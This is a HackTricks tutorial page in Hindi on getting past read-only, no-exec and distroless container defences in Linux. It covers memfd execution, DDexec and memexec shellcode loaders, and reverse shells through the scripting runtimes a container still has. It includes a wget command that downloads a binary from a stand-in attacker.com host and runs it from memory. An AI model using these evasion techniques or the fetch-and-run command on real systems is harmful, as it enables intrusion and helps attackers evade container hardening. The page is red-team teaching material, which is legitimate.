# FS सुरक्षा को बायपास करें: केवल पढ़ने के लिए / कोई निष्पादन नहीं / डिस्ट्रोलैस

{{#include ../../../banners/hacktricks-training.md}}

## वीडियो

निम्नलिखित वीडियो में आप इस पृष्ठ में उल्लेखित तकनीकों को अधिक गहराई से समझ सकते हैं:

- [**DEF CON 31 - Linux मेमोरी मैनिपुलेशन का अन्वेषण छिपने और बचने के लिए**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**DDexec-ng और इन-मेमोरी dlopen() के साथ छिपे हुए घुसपैठ - HackTricks ट्रैक 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## केवल पढ़ने के लिए / कोई निष्पादन नहीं परिदृश्य

यह अधिक से अधिक सामान्य होता जा रहा है कि लिनक्स मशीनें **केवल पढ़ने के लिए (ro) फ़ाइल प्रणाली सुरक्षा** के साथ माउंट की जाती हैं, विशेष रूप से कंटेनरों में। इसका कारण यह है कि ro फ़ाइल प्रणाली के साथ कंटेनर चलाना **`readOnlyRootFilesystem: true`** को `securitycontext` में सेट करने जितना आसान है:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

हालांकि, भले ही फ़ाइल प्रणाली को ro के रूप में माउंट किया गया हो, **`/dev/shm`** अभी भी लिखने योग्य होगा, इसलिए यह गलत है कि हम डिस्क में कुछ भी नहीं लिख सकते। हालाँकि, यह फ़ोल्डर **कोई निष्पादन सुरक्षा** के साथ माउंट किया जाएगा, इसलिए यदि आप यहाँ एक बाइनरी डाउनलोड करते हैं तो आप **इसे निष्पादित नहीं कर पाएंगे**।

> [!WARNING]
> एक रेड टीम के दृष्टिकोण से, यह **बाइनरी डाउनलोड और निष्पादित करना जटिल बनाता है** जो पहले से सिस्टम में नहीं हैं (जैसे बैकडोर या `kubectl` जैसे एन्यूमरेटर)।

## सबसे आसान बायपास: स्क्रिप्ट

ध्यान दें कि मैंने बाइनरी का उल्लेख किया, आप **किसी भी स्क्रिप्ट को निष्पादित कर सकते हैं** जब तक कि इंटरप्रेटर मशीन के अंदर हो, जैसे कि **शेल स्क्रिप्ट** यदि `sh` मौजूद है या **पायथन** **स्क्रिप्ट** यदि `python` स्थापित है।

हालांकि, यह आपके बाइनरी बैकडोर या अन्य बाइनरी उपकरणों को चलाने के लिए पर्याप्त नहीं है।

## मेमोरी बायपास

यदि आप एक बाइनरी को निष्पादित करना चाहते हैं लेकिन फ़ाइल प्रणाली ऐसा करने की अनुमति नहीं दे रही है, तो ऐसा करने का सबसे अच्छा तरीका है **इसे मेमोरी से निष्पादित करना**, क्योंकि **सुरक्षाएँ वहाँ लागू नहीं होती हैं**।

### FD + exec syscall बायपास

यदि आपके पास मशीन के अंदर कुछ शक्तिशाली स्क्रिप्ट इंजन हैं, जैसे **Python**, **Perl**, या **Ruby**, तो आप मेमोरी से निष्पादित करने के लिए बाइनरी डाउनलोड कर सकते हैं, इसे एक मेमोरी फ़ाइल डिस्क्रिप्टर (`create_memfd` syscall) में स्टोर कर सकते हैं, जो उन सुरक्षा द्वारा संरक्षित नहीं होगा और फिर **`exec` syscall** को कॉल कर सकते हैं जो **fd को निष्पादित करने के लिए फ़ाइल के रूप में इंगित करता है**।

इसके लिए आप आसानी से प्रोजेक्ट [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) का उपयोग कर सकते हैं। आप इसे एक बाइनरी पास कर सकते हैं और यह निर्दिष्ट भाषा में एक स्क्रिप्ट उत्पन्न करेगा जिसमें **बाइनरी संकुचित और b64 एन्कोडेड** होगी और इसे **डिकोड और अनकंप्रेस** करने के लिए निर्देश होंगे एक **fd** में जो `create_memfd` syscall को कॉल करके बनाया गया है और इसे चलाने के लिए **exec** syscall को कॉल किया गया है।

> [!WARNING]
> यह अन्य स्क्रिप्टिंग भाषाओं जैसे PHP या Node में काम नहीं करता क्योंकि उनके पास स्क्रिप्ट से कच्चे syscalls को कॉल करने का कोई डिफ़ॉल्ट तरीका नहीं है, इसलिए `create_memfd` को कॉल करके **मेमोरी fd** बनाने की संभावना नहीं है।
>
> इसके अलावा, `/dev/shm` में एक फ़ाइल के साथ **नियमित fd** बनाना काम नहीं करेगा, क्योंकि आपको इसे चलाने की अनुमति नहीं होगी क्योंकि **कोई निष्पादन सुरक्षा** लागू होगी।

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) एक तकनीक है जो आपको **अपने स्वयं के प्रोसेस की मेमोरी को संशोधित करने** की अनुमति देती है, इसके **`/proc/self/mem`** को ओवरराइट करके।

इसलिए, **प्रक्रिया द्वारा निष्पादित असेंबली कोड को नियंत्रित करते हुए**, आप एक **शेलकोड** लिख सकते हैं और प्रक्रिया को **किसी भी मनमाने कोड को निष्पादित करने के लिए "म्यूटेट"** कर सकते हैं।

> [!TIP]
> **DDexec / EverythingExec** आपको **मेमोरी** से अपने स्वयं के **शेलकोड** या **किसी भी बाइनरी** को लोड और **निष्पादित** करने की अनुमति देगा।
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) DDexec का स्वाभाविक अगला कदम है। यह एक **DDexec शेलकोड डेमोनाइज्ड** है, इसलिए हर बार जब आप **एक अलग बाइनरी चलाना चाहते हैं** तो आपको DDexec को फिर से लॉन्च करने की आवश्यकता नहीं है, आप बस DDexec तकनीक के माध्यम से memexec शेलकोड चला सकते हैं और फिर **नए बाइनरी लोड और चलाने के लिए इस डेमोन के साथ संवाद कर सकते हैं**।

आप **memexec का उपयोग करके PHP रिवर्स शेल से बाइनरी निष्पादित करने** का एक उदाहरण [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) पर पा सकते हैं।

### Memdlopen

DDexec के समान उद्देश्य के साथ, [**memdlopen**](https://github.com/arget13/memdlopen) तकनीक **बाइनरी को मेमोरी में लोड करने का एक आसान तरीका** प्रदान करती है ताकि बाद में उन्हें निष्पादित किया जा सके। यह निर्भरताओं के साथ बाइनरी लोड करने की अनुमति भी दे सकती है।

## Distroless Bypass

### What is distroless

Distroless कंटेनर केवल **विशिष्ट एप्लिकेशन या सेवा को चलाने के लिए आवश्यक न्यूनतम घटक** होते हैं, जैसे कि पुस्तकालय और रनटाइम निर्भरताएँ, लेकिन पैकेज प्रबंधक, शेल, या सिस्टम उपयोगिताओं जैसे बड़े घटकों को बाहर करते हैं।

Distroless कंटेनरों का लक्ष्य **अनावश्यक घटकों को समाप्त करके कंटेनरों के हमले की सतह को कम करना** और उन कमजोरियों की संख्या को कम करना है जिन्हें शोषित किया जा सकता है।

### Reverse Shell

एक distroless कंटेनर में आप **शायद `sh` या `bash`** भी नहीं पाएंगे ताकि एक नियमित शेल प्राप्त किया जा सके। आप बाइनरी जैसे `ls`, `whoami`, `id`... भी नहीं पाएंगे... जो कुछ भी आप आमतौर पर एक सिस्टम में चलाते हैं।

> [!WARNING]
> इसलिए, आप **रिवर्स शेल** प्राप्त करने या **सिस्टम की गणना** करने में सक्षम **नहीं होंगे** जैसे आप आमतौर पर करते हैं।

हालांकि, यदि समझौता किया गया कंटेनर उदाहरण के लिए एक फ्लास्क वेब चला रहा है, तो फिर पायथन स्थापित है, और इसलिए आप एक **Python रिवर्स शेल** प्राप्त कर सकते हैं। यदि यह नोड चला रहा है, तो आप एक नोड रिव शेल प्राप्त कर सकते हैं, और अधिकांश किसी भी **स्क्रिप्टिंग भाषा** के साथ यही स्थिति है।

> [!TIP]
> स्क्रिप्टिंग भाषा का उपयोग करके आप **भाषा की क्षमताओं का उपयोग करके सिस्टम की गणना** कर सकते हैं।

यदि **कोई `read-only/no-exec`** सुरक्षा नहीं है तो आप अपने रिवर्स शेल का दुरुपयोग करके **फाइल सिस्टम में अपने बाइनरी लिख सकते हैं** और **उन्हें निष्पादित** कर सकते हैं।

> [!TIP]
> हालाँकि, इस प्रकार के कंटेनरों में ये सुरक्षा आमतौर पर मौजूद होंगी, लेकिन आप **उन्हें बायपास करने के लिए पिछले मेमोरी निष्पादन तकनीकों का उपयोग कर सकते हैं**।

आप **कुछ RCE कमजोरियों का शोषण करने** के लिए **उदाहरण** पा सकते हैं ताकि स्क्रिप्टिंग भाषाएँ **रिवर्स शेल** प्राप्त कर सकें और मेमोरी से बाइनरी निष्पादित कर सकें [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) पर।


{{#include ../../../banners/hacktricks-training.md}}
